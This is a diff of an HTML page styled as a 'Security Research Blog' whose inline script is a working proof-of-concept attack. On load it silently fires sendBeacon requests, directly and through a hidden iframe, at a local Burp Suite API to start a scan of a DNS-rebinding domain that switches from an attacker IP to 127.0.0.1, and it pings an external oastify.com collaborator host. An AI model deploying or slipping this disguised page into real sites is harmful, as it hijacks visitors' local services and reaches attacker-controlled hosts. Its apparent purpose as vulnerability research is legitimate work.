@@ -5,22 +5,28 @@
 <h1>Security Research Blog</h1>
 <p>Latest articles on application security.</p>
 <script>
-// CHANGE THESE:
-var COLLAB = "9nxj42sqvz8r4iau647s33iqwh28qzeo.oastify.com";
-var ATTACKER_IP_HEX = "ac1f2001"; // Your VPS IP in hex (172.31.32.1 = ac1f2001)
+// CONFIG
+var COLLAB = "xmn73qreun7f369i5s6g2rhev51wpodd.oastify.com";
+var ATTACKER_IP = "172.31.32.1";
+var TARGET_IP = "127.0.0.1";
+var API_PORT = 1337;
 
-var REBIND = "7f000001." + ATTACKER_IP_HEX + ".rbndr.us";
-var ports = [1337, 9876];
+// 1u.ms DNS rebinding domain — first resolve → ATTACKER_IP, then → TARGET_IP
+var REBIND_DOMAIN = "make-" + ATTACKER_IP + "-rebind-" + TARGET_IP + "-rr.1u.ms";
 
-ports.forEach(function(port) {
-    var scan = JSON.stringify({urls: ["http://" + REBIND + ":" + port + "/"]});
-    try { navigator.sendBeacon("http://127.0.0.1:" + port + "/v0.1/scan", scan); } catch(e) {}
-    var f = document.createElement("iframe");
-    f.srcdoc = '<script>try{navigator.sendBeacon("http://127.0.0.1:' + port +
-        '/v0.1/scan",' + JSON.stringify(scan) + ')}catch(e){}<\/script>';
-    f.style.display = "none";
-    document.body.appendChild(f);
-});
+var scan = JSON.stringify({urls: ["http://" + REBIND_DOMAIN + ":" + API_PORT + "/"]});
+
+// Direct sendBeacon to Burp API (text/plain = no CORS preflight)
+try { navigator.sendBeacon("http://127.0.0.1:" + API_PORT + "/v0.1/scan", scan); } catch(e) {}
+
+// Also from null-origin iframe for extra reliability
+var f = document.createElement("iframe");
+f.srcdoc = '<script>try{navigator.sendBeacon("http://127.0.0.1:' + API_PORT + '/v0.1/scan",' +
+    JSON.stringify(scan) + ')}catch(e){}<\/script>';
+f.style.display = "none";
+document.body.appendChild(f);
+
 new Image().src = "https://" + COLLAB + "/poc-fired";
+console.log("[PoC] sendBeacon fired → scan targeting " + REBIND_DOMAIN + ":" + API_PORT);
 </script>
 </body></html>
